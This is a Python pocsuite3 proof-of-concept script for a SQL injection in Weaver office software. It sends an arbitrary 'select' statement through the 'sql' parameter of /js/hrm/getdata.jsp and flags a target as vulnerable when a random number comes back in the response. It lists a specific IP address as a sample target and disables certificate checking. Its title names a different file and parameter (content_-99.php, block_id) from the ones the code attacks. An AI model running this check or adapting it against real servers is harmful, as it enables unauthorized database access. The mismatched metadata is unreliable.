import random

from pocsuite3.api import requests
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase, logger
import ssl
import re

ssl._create_default_https_context = ssl._create_unverified_context

class TestPOC(POCBase):
    vulLevel = 3
    vulID = ''
    version = '1.0'
    author = ['']
    vulDate = '2016-07-24'
    createDate = '2016-07-24'
    updateDate = '2016-07-24'
    references = ['http://www.wooyun.org/bugs/wooyun-2010-076191']
    name = '泛微E-office /general/new_mytable/content_list/content_-99.php 参数block_id注入漏洞'
    appPowerLink = ''
    appName = 'weaver_office'
    appVersion = ''
    vulType = '注入漏洞'
    desc = '''
    '''
    samples = ['http://58.20.57.73:88/']

    def _verify(self):
        result = {}
        randomNum=random.randint(10000000000000000000,99999999999999999999)
        vulurl = "{}/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20{}%20as%20id".format(
                self.url.rstrip('/'),str(randomNum))
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
        }
        try:
            resp = requests.get(url=vulurl,headers=headers,timeout=5,verify=False)
            if resp.status_code == 200 and 'html' not in resp.text and str(randomNum) in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = vulurl
        except Exception as e:
            print(e)
            logger.error("connect target '{} failed!'".format(self.url))
        return self.parse_attack(result)



    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register_poc(TestPOC)